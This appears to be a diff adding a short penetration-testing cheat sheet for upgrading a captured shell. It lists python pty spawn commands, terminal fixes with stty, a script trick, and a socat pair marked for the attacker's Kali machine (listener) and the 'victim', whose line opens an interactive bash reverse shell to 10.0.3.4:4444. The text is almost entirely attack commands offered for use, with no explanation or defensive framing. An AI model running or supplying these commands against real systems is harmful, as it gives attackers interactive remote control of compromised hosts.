@@ -1,0 +1,11 @@
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games ; export TERM=xterm-256color ; alias ll='clear ; ls -lsaht --color=auto'
+stty raw -echo ; fg ; reset
+
+===script===
+/usr/bin/script -qc /bin/bash /dev/null
+
+===socat===
+On Kali (listen): 1 socat file:`tty`,raw,echo=0 tcp-listen:4444 
+On Victim (launch): 1 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
